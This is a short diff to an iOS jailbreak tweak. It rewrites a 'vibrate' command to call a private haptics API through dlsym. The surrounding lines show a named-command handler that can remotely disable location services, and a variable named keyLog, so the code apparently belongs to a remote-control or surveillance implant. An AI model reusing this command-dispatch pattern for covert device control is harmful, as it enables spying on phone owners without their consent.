@@ -36,8 +36,16 @@ NSString *keyLog;
     } else if ([command isEqual:@"locoff"]) {
         [%c(CLLocationManager) setLocationServicesEnabled:false];
     } else if ([command isEqual:@"vibrate"]) {
-    	AudioServicesPlaySystemSound(1521);
-        AudioServicesPlaySystemSound(1521);
+    	typedef void* (*vibratePointer)(SystemSoundID inSystemSoundID, id arg, NSDictionary *vibratePattern);
+        NSMutableArray* vPattern = [NSMutableArray array];
+        [vPattern addObject:[NSNumber numberWithBool:YES]];
+        [vPattern addObject:[NSNumber numberWithInt:100]];
+        NSDictionary *vDict = @{ @"VibePattern" : vPattern, @"Intensity" : @1 };
+
+        vibratePointer vibrate;
+        void *handle = dlopen(0, 9);
+        *(void**)(&vibrate) = dlsym(handle,"AudioServicesPlaySystemSoundWithVibration");
+        vibrate(kSystemSoundID_Vibrate, nil, vDict);
     }
 }
 
